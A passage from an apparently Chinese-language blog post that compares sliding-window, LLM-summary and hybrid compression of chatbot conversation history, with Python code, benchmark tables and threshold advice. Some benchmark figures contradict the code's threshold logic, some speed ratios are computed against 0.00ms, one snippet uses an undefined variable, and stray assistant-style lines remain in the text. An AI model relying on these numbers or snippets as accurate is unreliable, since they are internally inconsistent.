<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 同步（阻塞用户）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">user_input</span>):
    compressed = compressor.compress(history)  <span class="hljs-comment"># 等待8秒</span>
    response = llm.chat(compressed)
    <span class="hljs-keyword">return</span> response

<span class="hljs-comment"># 异步（不阻塞）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">user_input</span>):
    <span class="hljs-comment"># 后台异步压缩</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(history) &gt; <span class="hljs-number">30</span>:
        asyncio.create_task(compress_in_background())
    
    <span class="hljs-comment"># 直接用未压缩的历史回复</span>
    response = llm.chat(history)
    <span class="hljs-keyword">return</span> response
</code></pre>
<p><strong>4. 缓存摘要结果</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LLMSummaryCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.summary_cache = {}  <span class="hljs-comment"># 缓存已生成的摘要</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        <span class="hljs-comment"># 检查是否有缓存</span>
        cache_key = <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">tuple</span>(m[<span class="hljs-string">'content'</span>] <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> messages[:-<span class="hljs-number">6</span>]))
        <span class="hljs-keyword">if</span> cache_key <span class="hljs-keyword">in</span> self.summary_cache:
            <span class="hljs-keyword">return</span> self.summary_cache[cache_key]  <span class="hljs-comment"># 直接返回</span>
        
        <span class="hljs-comment"># 生成新摘要</span>
        summary = self._summarize(messages[:-<span class="hljs-number">6</span>])
        self.summary_cache[cache_key] = summary
        <span class="hljs-keyword">return</span> summary
</code></pre>
<hr/>
<h4 data-id="heading-49"><strong>小结</strong></h4>
<p>LLM摘要压缩器的真实表现：</p>
<pre><code class="hljs language-diff" lang="diff">核心优势：
✅ 100%信息保留（唯一亮点）
✅ 智能理解对话内容
✅ 提取关键信息

核心劣势：
❌ 短对话负优化（token反增）
❌ 速度极慢（8.5秒）
❌ 有明确成本（$0.0001/次）

定位：
仅适合超长对话（≥30轮）+ 需要保留用户信息的场景

对比滑动窗口：
<span class="hljs-deletion">- Token效率：❌ 更差</span>
<span class="hljs-deletion">- 速度：❌ 慢460万倍</span>
<span class="hljs-deletion">- 成本：❌ 有成本</span>
<span class="hljs-deletion">- 信息保留：✅ 完胜（100% vs 0%）</span>
</code></pre>
<p><strong>结论：LLM摘要不是通用方案，只在特定场景下才值得使用。</strong></p>
<p>在下一节，我们将看到<strong>混合策略</strong> - 结合两者优势，自动选择最优方案。</p>
<hr/>
<p>这将是最实用的策略 - 自动在滑动窗口和LLM摘要之间选择！😊</p>
<p>好的！根据真实测试数据，让我写一个完整的混合策略部分 📝</p>
<hr/>
<h3 data-id="heading-50"><strong>3.4 策略3：混合策略（Hybrid）</strong></h3>
<h4 data-id="heading-51"><strong>核心原理</strong></h4>
<p>混合策略是一种<strong>自适应压缩</strong>方案：根据对话长度自动选择最优策略。</p>
<pre><code class="hljs language-markdown" lang="markdown">决策流程：
┌─────────────────┐
│  计算对话轮数   │
└────────┬────────┘
<span class="hljs-code">         │
    ┌────▼────────┐
    │轮数≤阈值(10)?│
    └────┬────────┘
         │
    ┌────▼─────────────────────┐
    │ 是              │ 否      │
┌───▼──────┐      ┌──▼─────────┐
│滑动窗口   │      │  LLM摘要   │
│- 速度快   │      │  - 保留信息│
│- 零成本   │      │  - 速度慢  │
│- 简单直接 │      │  - 有成本  │
└──────────┘      └────────────┘
</span></code></pre>
<p><strong>设计思想：</strong></p>
<p>在短对话和长对话中，用户的核心需求不同：</p>
<pre><code class="hljs language-diff" lang="diff">短对话（≤10轮）：
<span class="hljs-deletion">- 用户需求：快速响应</span>
<span class="hljs-deletion">- 痛点：等待时间</span>
<span class="hljs-deletion">- 信息丢失风险：低（对话刚开始）</span>
<span class="hljs-deletion">- 最优策略：滑动窗口</span>

长对话（&gt;10轮）：
<span class="hljs-deletion">- 用户需求：记住之前说的话</span>
<span class="hljs-deletion">- 痛点：重复解释</span>
<span class="hljs-deletion">- 信息丢失风险：高（早期信息已被删除）</span>
<span class="hljs-deletion">- 最优策略：LLM摘要</span>
</code></pre>
<p><strong>核心假设：</strong> 在长对话中，用户体验的提升 &gt; Token成本和速度损失</p>
<h4 data-id="heading-52"><strong>代码实现</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Dict</span>
<span class="hljs-keyword">from</span> src.llm.base <span class="hljs-keyword">import</span> BaseLLM
<span class="hljs-keyword">from</span> src.memory.compressor <span class="hljs-keyword">import</span> SlidingWindowCompressor, LLMSummaryCompressor


<span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridCompressor</span>:
    <span class="hljs-string">"""
    混合策略压缩器
    
    特点：
    - 自动选择最优策略
    - 短对话快速，长对话智能
    - 平衡效率与体验
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 llm: BaseLLM,
                 threshold_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">10</span>,
                 keep_recent_turns: <span class="hljs-built_in">int</span> = <span class="hljs-number">5</span></span>):
        <span class="hljs-string">"""
        Args:
            llm: LLM实例
            threshold_turns: 切换阈值（轮数）
            keep_recent_turns: 保留最近几轮
        """</span>
        self.llm = llm
        self.threshold_turns = threshold_turns
        
        <span class="hljs-comment"># 初始化两种策略</span>
        self.sliding_window = SlidingWindowCompressor(
            keep_turns=keep_recent_turns
        )
        self.llm_summary = LLMSummaryCompressor(
            llm=llm,
            keep_recent_turns=keep_recent_turns
        )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]:
        <span class="hljs-string">"""
        根据对话长度自动选择策略
        
        Args:
            messages: 原始消息列表
            
        Returns:
            压缩后的消息列表
        """</span>
        <span class="hljs-comment"># 计算当前轮数</span>
        turn_count = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        
        <span class="hljs-comment"># 决策：选择哪个策略</span>
        <span class="hljs-keyword">if</span> turn_count &lt;= self.threshold_turns:
            <span class="hljs-comment"># 短对话：使用滑动窗口（快速、低成本）</span>
            <span class="hljs-keyword">return</span> self.sliding_window.compress(messages)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># 长对话：使用LLM摘要（智能、保留信息）</span>
            <span class="hljs-keyword">return</span> self.llm_summary.compress(messages)
</code></pre>
<p><strong>核心逻辑就一行：</strong> 根据轮数判断用哪个策略。</p>
<h4 data-id="heading-53"><strong>真实性能测试</strong></h4>
<p>我们对混合策略进行了完整测试，统一了所有参数（<code>keep_turns=5</code>），以下是真实数据：</p>
<hr/>
<p><strong>测试1：策略自动选择（验证正确性）</strong></p>
<p>配置：阈值=10轮，保留5轮</p>













































<table><thead><tr><th>对话长度</th><th>轮数</th><th>预期策略</th><th>实际策略</th><th>压缩结果</th><th>耗时</th></tr></thead><tbody><tr><td>短对话</td><td>5轮</td><td>滑动窗口</td><td>滑动窗口 ✅</td><td>10条→10条</td><td>0.00ms</td></tr><tr><td>中等对话</td><td>10轮</td><td>滑动窗口</td><td>滑动窗口 ✅</td><td>20条→10条</td><td>0.00ms</td></tr><tr><td>长对话</td><td>21轮</td><td>LLM摘要</td><td>LLM摘要 ✅</td><td>42条→11条</td><td>11,832ms</td></tr><tr><td>超长对话</td><td>34轮</td><td>LLM摘要</td><td>LLM摘要 ✅</td><td>68条→11条</td><td>14,534ms</td></tr></tbody></table>
<p><strong>结论：策略切换逻辑100%准确。</strong></p>
<hr/>
<p><strong>测试2：三种策略性能对比（关键测试！）</strong></p>
<p>统一参数配置：</p>
<ul>
<li>滑动窗口：保留5轮</li>
<li>混合策略：保留5轮（短对话时）</li>
<li>LLM摘要：保留3轮 + 摘要</li>
</ul>
<hr/>
<p><strong>场景1：短对话（5轮，126 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>滑动窗口</td><td>10条</td><td>126</td><td>0%</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>303</td><td>-141% ❌</td><td>7,471ms</td><td>$0.0001</td></tr><tr><td><strong>混合策略</strong></td><td><strong>10条</strong></td><td><strong>126</strong></td><td><strong>0%</strong></td><td>0.01ms</td><td>$0</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs">✅ 滑动窗口 vs 混合策略：完全一致
   10条消息, 126 tokens
</code></pre>
<p><strong>关键发现：参数统一后，短对话时混合策略与滑动窗口完全相同！</strong></p>
<hr/>
<p><strong>场景2：中等对话（10轮，249 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>滑动窗口</td><td>10条</td><td>123</td><td>51%</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>388</td><td>-56% ❌</td><td>7,992ms</td><td>$0.0001</td></tr><tr><td><strong>混合策略</strong></td><td><strong>10条</strong></td><td><strong>123</strong></td><td><strong>51%</strong></td><td>0.01ms</td><td>$0</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs">✅ 滑动窗口 vs 混合策略：完全一致
   10条消息, 123 tokens
</code></pre>
<p><strong>再次验证：10轮（阈值边界）时，混合策略 = 滑动窗口。</strong></p>
<hr/>
<p><strong>场景3：长对话（20轮，560 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>145</strong></td><td><strong>74%</strong> ✅</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>597</td><td>-7% ❌</td><td>13,446ms</td><td>$0.0001</td></tr><tr><td>混合策略</td><td>11条</td><td>604</td><td>-8% ❌</td><td>11,663ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-bash" lang="bash">📊 滑动窗口 vs 混合策略（使用LLM）：
   滑动窗口: 145 tokens, 0.00ms, <span class="hljs-variable">$0</span>
   混合策略: 604 tokens, 11,663ms, <span class="hljs-variable">$0</span>.0001
   ⚠️ 混合策略Token多 4.2x
</code></pre>
<p><strong>关键矛盾出现：</strong></p>
<ul>
<li>Token效率：滑动窗口完胜（145 vs 604）</li>
<li>速度：滑动窗口完胜（0ms vs 11,663ms）</li>
<li>成本：滑动窗口完胜（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mi>v</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">0 vs </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">s</span></span></span></span></span>0.0001）</li>
</ul>
<p><strong>但这是trade-off，不是bug！</strong> 混合策略牺牲了效率，换取信息保留。</p>
<hr/>
<p><strong>场景4：超长对话（30轮，933 tokens）</strong></p>





































<table><thead><tr><th>策略</th><th>结果</th><th>Token</th><th>压缩率</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td><strong>滑动窗口</strong></td><td>10条</td><td><strong>144</strong></td><td><strong>85%</strong> ✅</td><td>0.00ms</td><td>$0</td></tr><tr><td>LLM摘要</td><td>7条</td><td>608</td><td>35%</td><td>13,204ms</td><td>$0.0001</td></tr><tr><td>混合策略</td><td>11条</td><td>728</td><td>22%</td><td>14,809ms</td><td>$0.0001</td></tr></tbody></table>
<p><strong>对比分析：</strong></p>
<pre><code class="hljs language-bash" lang="bash">📊 滑动窗口 vs 混合策略（使用LLM）：
   滑动窗口: 144 tokens, 0.00ms, <span class="hljs-variable">$0</span>
   混合策略: 728 tokens, 14,809ms, <span class="hljs-variable">$0</span>.0001
   ⚠️ 混合策略Token多 5.1x
</code></pre>
<p><strong>差距更大了！</strong> 在超长对话中，混合策略的Token是滑动窗口的5倍。</p>
<hr/>
<p><strong>测试3：不同阈值的影响</strong></p>
<p>在20轮对话（560 tokens）中测试不同阈值：</p>















































<table><thead><tr><th>阈值</th><th>使用策略</th><th>压缩后Tokens</th><th>耗时</th><th>成本</th></tr></thead><tbody><tr><td>5轮</td><td>LLM摘要</td><td>538</td><td>10,926ms</td><td>$0.0001</td></tr><tr><td>10轮</td><td>LLM摘要</td><td>538</td><td>10,555ms</td><td>$0.0001</td></tr><tr><td>15轮</td><td>LLM摘要</td><td>546</td><td>10,872ms</td><td>$0.0001</td></tr><tr><td>20轮</td><td>LLM摘要</td><td>593</td><td>11,278ms</td><td>$0.0001</td></tr><tr><td><strong>25轮</strong></td><td><strong>滑动窗口</strong></td><td><strong>145</strong></td><td><strong>0.00ms</strong></td><td><strong>$0</strong></td></tr></tbody></table>
<p><strong>关键发现：</strong></p>
<pre><code class="hljs language-diff" lang="diff">阈值≤20轮：都用LLM摘要
<span class="hljs-deletion">- Token: 538-593（效率差）</span>
<span class="hljs-deletion">- 耗时: 10-11秒（很慢）</span>
<span class="hljs-deletion">- 成本: $0.0001</span>

阈值=25轮：用滑动窗口
<span class="hljs-deletion">- Token: 145（效率高）</span>
<span class="hljs-deletion">- 耗时: 0ms（极快）</span>
<span class="hljs-deletion">- 成本: $0</span>
</code></pre>
<p><strong>阈值设置的矛盾：</strong></p>
<ul>
<li>阈值太低（5轮）→ 短对话也用LLM，负优化</li>
<li>阈值太高（25轮）→ 大部分对话用滑动窗口，失去意义</li>
<li><strong>推荐：10-15轮</strong> 之间平衡</li>
</ul>
<hr/>
<p><strong>测试4：信息保留对比（核心价值！）</strong></p>
<p>15轮对话，包含5个关键信息：Tom、28岁、上海、浦东、AI工程师</p>




















<table><thead><tr><th>策略</th><th>保留</th><th>详情</th></tr></thead><tbody><tr><td>滑动窗口（5轮）</td><td><strong>0/5 = 0%</strong></td><td>❌ 全部丢失：Tom, 28岁, 上海, 浦东, AI工程师</td></tr><tr><td><strong>混合策略（阈值10轮）</strong></td><td><strong>5/5 = 100%</strong></td><td>✅ 全部保留：Tom, 28岁, 上海, 浦东, AI工程师</td></tr></tbody></table>
<p><strong>这就是混合策略存在的意义！</strong></p>
<p>虽然Token效率差（4-5倍），但：</p>
<ul>
<li>✅ 保留了所有用户信息</li>
<li>✅ 避免了"AI失忆"体验</li>
<li>✅ 用户不需要重复信息</li>
</ul>
<p><strong>用户体验对比：</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">场景：<span class="hljs-number">15</span>轮对话后，用户问<span class="hljs-string">"推荐餐厅"</span>

滑动窗口（<span class="hljs-number">0</span><span class="hljs-comment">%保留）：</span>
用户：<span class="hljs-string">"推荐一家适合我的餐厅"</span>
AI：<span class="hljs-string">"你想要什么类型的餐厅？"</span>
用户：<span class="hljs-string">"我前面说过了，我在上海浦东..."</span> ❌ 
      （用户需要重复信息，体验差）

混合策略（<span class="hljs-number">100</span><span class="hljs-comment">%保留）：</span>
用户：<span class="hljs-string">"推荐一家适合我的餐厅"</span>
AI：<span class="hljs-string">"Tom，根据你在上海浦东工作，推荐..."</span> ✅
      （无缝体验，自然连贯）
</code></pre>
<hr/>
<p><strong>测试5：成本效益分析</strong></p>
<p>模拟100次随机长度（5-30轮）的对话：</p>
<pre><code class="hljs language-bash" lang="bash">统计结果：
- 短对话（≤10轮）：20次
- 长对话（&gt;10轮）：80次

成本对比：
- 纯滑动窗口：<span class="hljs-variable">$0</span>.0000
- 纯LLM摘要：<span class="hljs-variable">$0</span>.0100（100次 × <span class="hljs-variable">$0</span>.0001）
- 混合策略：<span class="hljs-variable">$0</span>.0080（80次 × <span class="hljs-variable">$0</span>.0001）

混合策略优势：
- 20次短对话用滑动窗口（快速+<span class="hljs-variable">$0</span>）
- 80次长对话用LLM摘要（智能+<span class="hljs-variable">$0</span>.0001）
- vs 纯LLM摘要：节省 20%（<span class="hljs-variable">$0</span>.002）
- vs 纯滑动窗口：多花 <span class="hljs-variable">$0</span>.008（换取信息保留）
</code></pre>
<p><strong>成本分析：</strong></p>
<ul>
<li>混合策略比纯LLM摘要便宜20%</li>
<li>但比纯滑动窗口贵（滑动窗口是$0）</li>
<li>这$0.008换来的是80次长对话的完美用户体验</li>
</ul>
<p>完整测试代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsotopelaez092-star%2Fmemory-chatbot%2Fblob%2Fmain%2Ftests%2Ftest_hybrid.py" target="_blank" title="https://github.com/sotopelaez092-star/memory-chatbot/blob/main/tests/test_hybrid.py" ref="nofollow noopener noreferrer">github.com/sotopelaez0…</a></p>
<hr/>
<h4 data-id="heading-54"><strong>核心矛盾：Token效率 vs 用户体验</strong></h4>
<p>测试数据揭示了混合策略的<strong>本质权衡</strong>：</p>
<p><strong>Token效率排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：145 tokens（74%压缩）⭐
<span class="hljs-bullet">2.</span> LLM摘要：597 tokens（-7%）
<span class="hljs-bullet">3.</span> 混合策略：604 tokens（-8%）

结论：滑动窗口最优，混合策略最差
</code></pre>
<p><strong>用户体验排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 混合策略/LLM摘要：100%信息保留 ⭐
<span class="hljs-bullet">2.</span> 滑动窗口：0%信息保留

结论：混合策略/LLM摘要完胜
</code></pre>
<p><strong>速度排名：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 滑动窗口：0.00ms ⭐
<span class="hljs-bullet">2.</span> 混合策略：11,663ms（慢1,166万倍）
<span class="hljs-bullet">3.</span> LLM摘要：13,446ms

结论：滑动窗口完胜
</code></pre>
<p><strong>成本排名：</strong></p>
<pre><code class="hljs language-bash" lang="bash">1. 滑动窗口：<span class="hljs-variable">$0</span> ⭐
2. 混合策略：<span class="hljs-variable">$0</span>.0001（视场景）
3. LLM摘要：<span class="hljs-variable">$0</span>.0001

结论：滑动窗口完胜
</code></pre>
<p><strong>混合策略只在"信息保留"这一个维度获胜，其他全输！</strong></p>
<p>但这正是它的价值定位：<strong>当用户体验比系统效率更重要时，混合策略是最优解。</strong></p>
<hr/>
<h4 data-id="heading-55"><strong>混合策略的真实定位</strong></h4>
<p>基于测试数据，混合策略的定位应该是：</p>
<p><strong>不是为了优化Token，而是为了优化用户体验。</strong></p>
<pre><code class="hljs language-erlang" lang="erlang">核心价值：
✅ 短对话（<span class="hljs-number">20</span><span class="hljs-comment">%）：用滑动窗口，保持速度和零成本</span>
✅ 长对话（<span class="hljs-number">80</span><span class="hljs-comment">%）：用LLM摘要，保留用户信息</span>

付出代价：
❌ Token效率差（长对话时多用<span class="hljs-number">4</span>-<span class="hljs-number">5</span>倍）
❌ 速度慢（长对话时需要<span class="hljs-number">10</span>-<span class="hljs-number">15</span>秒）
❌ 有成本（长对话时$<span class="hljs-number">0.0001</span>/次）

适用场景：
当<span class="hljs-string">"不让用户重复信息"</span>比<span class="hljs-string">"节省Token"</span>更重要时
</code></pre>
<hr/>
<h4 data-id="heading-56"><strong>优缺点总结</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 三大优势：</strong></p>
<ol>
<li><strong>自动决策，无需人工</strong></li>
</ol>

<pre><code class="hljs">系统根据对话长度自动选择
开发者无需判断，用户无感知
</code></pre>
<ol>
<li><strong>短对话零损失</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">测试验证：短对话时完全等同于滑动窗口
<span class="hljs-deletion">- Token: 完全相同</span>
<span class="hljs-deletion">- 速度: 完全相同</span>
<span class="hljs-deletion">- 成本: 完全相同</span>
</code></pre>
<ol>
<li><strong>长对话保留信息</strong></li>
</ol>

<pre><code class="hljs language-erlang" lang="erlang">测试数据：<span class="hljs-number">100</span><span class="hljs-comment">%保留关键信息</span>
vs 滑动窗口：<span class="hljs-number">0</span><span class="hljs-comment">%保留</span>
避免用户重复解释，体验提升明显
</code></pre>
<p><strong>❌ 三大劣势：</strong></p>
<ol>
<li><strong>Token效率差</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">长对话实测：
<span class="hljs-deletion">- 20轮：多用4.2倍Token</span>
<span class="hljs-deletion">- 30轮：多用5.1倍Token</span>

问题：增加了后续对话的成本
</code></pre>
<ol>
<li><strong>速度慢</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">长对话实测：
<span class="hljs-deletion">- 20轮：11,663ms（约12秒）</span>
<span class="hljs-deletion">- 30轮：14,809ms（约15秒）</span>

问题：用户需要等待，可能影响体验
</code></pre>
<ol>
<li><strong>阈值难调优</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">测试显示：
<span class="hljs-deletion">- 阈值太低（5轮）：短对话也用LLM，负优化</span>
<span class="hljs-deletion">- 阈值太高（25轮）：大多数对话用滑动窗口，失去意义</span>
<span class="hljs-deletion">- 最佳阈值：10-15轮（但需要根据场景调整）</span>

问题：没有通用的"最优阈值"
</code></pre>
<hr/>
<h4 data-id="heading-57"><strong>适用场景指南</strong></h4>
<p>基于真实测试数据：</p>
<p><strong>✅ 推荐使用：</strong></p>
<ol>
<li><strong>通用对话产品</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：对话长度不可预测
理由：
<span class="hljs-deletion">- 自动适应，无需人工判断</span>
<span class="hljs-deletion">- 短对话保持高效</span>
<span class="hljs-deletion">- 长对话保留信息</span>
<span class="hljs-deletion">- 测试证明：节省20%成本 vs 纯LLM</span>

典型：聊天助手、客服机器人、AI顾问
</code></pre>
<ol>
<li><strong>用户体验优先</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：付费产品、VIP服务
理由：
<span class="hljs-deletion">- 用户付费，期望更好体验</span>
<span class="hljs-deletion">- 愿意承担额外成本</span>
<span class="hljs-deletion">- "不让用户重复"比"节省Token"重要</span>
<span class="hljs-deletion">- 测试证明：100%信息保留</span>

典型：高端客服、个人助理、教育辅导
</code></pre>
<ol>
<li><strong>对话长度两极分化</strong></li>
</ol>

<pre><code class="hljs language-diff" lang="diff">场景：既有快速咨询，又有深度讨论
理由：
<span class="hljs-deletion">- 测试显示：20%短对话+80%长对话</span>
<span class="hljs-deletion">- 混合策略针对性优化各场景</span>
<span class="hljs-deletion">- 比任何单一策略都好</span>

典型：综合服务平台、多功能助手
</code></pre>
<p><strong>❌ 不推荐使用：</strong></p>
<ol>
<li><strong>成本敏感场景</strong></li>
</ol>

<pre><code class="hljs language-bash" lang="bash">问题：混合策略有成本（虽然比纯LLM低20%）
数据：100次对话<span class="hljs-variable">$0</span>.008 vs 滑动窗口<span class="hljs-variable">$0</span>
替代：纯滑动窗口

典型：大规模免费产品、初创公司
</code></pre>
<ol>
<li><strong>已知短对话场景</strong></li>
</ol>

<pre><code class="hljs">问题：如果对话肯定&lt;10轮，混合策略=滑动窗口
数据：测试证明短对话时完全相同
替代：直接用滑动窗口，系统更简单

典型：FAQ机器人、快速查询
</code></pre>
<ol>
<li><strong>Token预算严格</strong></li>
</ol>

<pre><code class="hljs">问题：长对话时Token效率差
数据：多用4-5倍Token
替代：滑动窗口或Token动态策略

典型：严格控制成本的企业应用
</code></pre>
<ol>
<li><strong>实时性要求极高</strong></li>
</ol>

<pre><code class="hljs">问题：长对话时有10-15秒延迟
数据：实测11,663ms vs 滑动窗口0.00ms
替代：纯滑动窗口

典型：实时客服、游戏NPC、语音助手
</code></pre>
<hr/>
<h4 data-id="heading-58"><strong>阈值调优建议</strong></h4>
<p>基于测试数据，给出阈值设置建议：</p>
<p><strong>推荐阈值：10轮</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 通用场景（推荐）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">10</span>)
</code></pre>
<p><strong>理由：</strong></p>
<pre><code class="hljs language-diff" lang="diff">测试数据分析：
<span class="hljs-deletion">- 5轮：太低，短对话也用LLM（负优化）</span>
<span class="hljs-deletion">- 10轮：平衡，测试显示20%短对话+80%长对话</span>
<span class="hljs-deletion">- 15轮：偏保守，更多对话用滑动窗口</span>
<span class="hljs-deletion">- 20轮：太高，测试时才刚切换到LLM</span>
<span class="hljs-deletion">- 25轮：过高，几乎不用LLM，失去意义</span>

最佳：10轮
<span class="hljs-deletion">- 短对话完全使用滑动窗口（速度+成本）</span>
<span class="hljs-deletion">- 长对话及时切换到LLM（信息保留）</span>
</code></pre>
<p><strong>根据场景调整：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 偏向速度（更多用滑动窗口）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">15</span>)
<span class="hljs-comment"># 适用：成本敏感、速度优先</span>

<span class="hljs-comment"># 偏向信息保留（更多用LLM）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">8</span>)
<span class="hljs-comment"># 适用：用户体验优先、付费产品</span>

<span class="hljs-comment"># 激进保留（尽早用LLM）</span>
compressor = HybridCompressor(llm, threshold_turns=<span class="hljs-number">5</span>)
<span class="hljs-comment"># 适用：高端服务、个性化要求高</span>
<span class="hljs-comment"># 注意：短对话也会用LLM，成本更高</span>
</code></pre>
<hr/>
<h4 data-id="heading-59"><strong>最佳实践</strong></h4>
<p><strong>1. 监控策略使用比例</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HybridCompressor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.stats = {
            <span class="hljs-string">"sliding_count"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"llm_count"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"sliding_tokens"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"llm_tokens"</span>: <span class="hljs-number">0</span>
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">self, messages</span>):
        turn_count = <span class="hljs-built_in">len</span>(messages) // <span class="hljs-number">2</span>
        
        <span class="hljs-keyword">if</span> turn_count &lt;= self.threshold_turns:
            self.stats[<span class="hljs-string">"sliding_count"</span>] += <span class="hljs-number">1</span>
            result = self.sliding_window.compress(messages)
            self.stats[<span class="hljs-string">"sliding_tokens"</span>] += <span class="hljs-built_in">sum</span>(
                llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result
            )
        <span class="hljs-keyword">else</span>:
            self.stats[<span class="hljs-string">"llm_count"</span>] += <span class="hljs-number">1</span>
            result = self.llm_summary.compress(messages)
            self.stats[<span class="hljs-string">"llm_tokens"</span>] += <span class="hljs-built_in">sum</span>(
                llm.count_tokens(m[<span class="hljs-string">'content'</span>]) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> result
            )
        
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_stats</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""获取使用统计"""</span>
        total = self.stats[<span class="hljs-string">"sliding_count"</span>] + self.stats[<span class="hljs-string">"llm_count"</span>]
        <span class="hljs-keyword">if</span> total == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> {}
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"sliding_ratio"</span>: self.stats[<span class="hljs-string">"sliding_count"</span>] / total,
            <span class="hljs-string">"llm_ratio"</span>: self.stats[<span class="hljs-string">"llm_count"</span>] / total,
            <span class="hljs-string">"avg_tokens_sliding"</span>: self.stats[<span class="hljs-string">"sliding_tokens"</span>] / self.stats[<span class="hljs-string">"sliding_count"</span>] <span class="hljs-keyword">if</span> self.stats[<span class="hljs-string">"sliding_count"</span>] &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>,
            <span class="hljs-string">"avg_tokens_llm"</span>: self.stats[<span class="hljs-string">"llm_tokens"</span>] / self.stats[<span class="hljs-string">"llm_count"</span>] <span class="hljs-keyword">if</span> self.stats[<span class="hljs-string">"llm_count"</span>] &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
        }

<span class="hljs-comment"># 定期检查</span>
stats = compressor.get_stats()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"滑动窗口使用率: <span class="hljs-subst">{stats[<span class="hljs-string">'sliding_ratio'</span>]:<span class="hljs-number">.1</span>%}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"LLM摘要使用率: <span class="hljs-subst">{stats[<span class="hljs-string">'llm_ratio'</span>]:<span class="hljs-number">.1</span>%}</span>"</span>)
